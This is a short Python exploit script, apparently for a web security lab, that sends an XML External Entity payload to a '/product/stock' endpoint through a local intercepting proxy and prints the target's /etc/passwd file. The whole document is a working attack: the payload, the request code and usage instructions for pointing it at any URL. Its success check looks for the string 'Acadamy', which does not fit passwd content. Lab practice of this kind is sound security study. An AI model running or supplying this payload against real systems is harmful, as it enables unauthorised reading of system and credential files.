import sys
import urllib3
import requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def exploit_xxe(s,url):
    print('[+] Exploiting XXE Vulnerability...')
    stock_path = url + '/product/stock'
    exploit = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>'
    r = s.post(stock_path,data=exploit,verify=False,proxies=proxies)
    print('[+] The following is the content of the /etc/passwd file:')
    print(r.text)
    if 'Acadamy' in r.text:
        print('[+]Exploit Successful')
    else:
        print('[-] Exploit Unsuccesful')
    sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print('[Oops]')
        print('[+] Usage: %s <url>' % sys.argv[0])
        print('[+] Example: %s www.example.com' % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    exploit_xxe(s, url)

if __name__ == '__main__':
    main()